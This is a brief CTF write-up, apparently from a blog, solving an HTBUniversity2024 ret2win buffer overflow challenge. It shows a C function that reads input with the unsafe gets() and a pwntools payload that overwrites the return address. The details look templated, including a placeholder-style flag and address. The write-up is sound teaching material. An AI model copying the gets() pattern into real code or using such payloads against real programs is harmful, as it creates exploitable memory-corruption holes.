---
title: "buffer overflow"
date: 2025-06-27T10:45:40+02:00
description: "buffer overflow writeup from HTBUniversity2024 CTF - Binary Exploitation challenge"
categories:
    - "CTF Writeups"
    - "Binary Exploitation"
tags:
    - "CTF"
    - "HTBUniversity2024"
    - "Binary Exploitation"
    - "Cybersecurity"
event: "HTBUniversity2024"
challenge: "buffer overflow"
category: "Binary Exploitation"
image: "/images/ctf/htbuniversity2024/buffer-overflow-screenshot.png"
weight: 1
---

# buffer overflow

**Event:** HTBUniversity2024 | **Category:** Binary Exploitation

---


# Buffer Overflow

## Challenge Description

A classic buffer overflow challenge. Can you control the execution flow?

## Solution

This challenge involves a simple buffer overflow with a ret2win technique.

### Step 1: Analysis

Running `checksec` on the binary shows:
- No ASLR
- No stack canaries
- NX disabled

### Step 2: Finding the Vulnerability

The `vulnerable_function()` uses `gets()` which doesn't check buffer bounds.

```c
void vulnerable_function() {
    char buffer[64];
    gets(buffer);
}
```

### Step 3: Exploitation

We need to overflow the buffer and redirect execution to the `win()` function.

```python
from pwn import *

# Calculate offset
offset = 72

# Address of win function
win_addr = 0x401234

payload = b'A' * offset + p64(win_addr)
```

### Step 4: Flag

After successful exploitation, the `win()` function prints the flag.

**Flag:** `HTB{f4k3_buff3r_0v3rfl0w_t35t}` 

---

**Navigation:**
- [← Back to HTBUniversity2024 Overview](/ctf/htbuniversity2024/)
- [View All CTF Writeups](/ctf/)
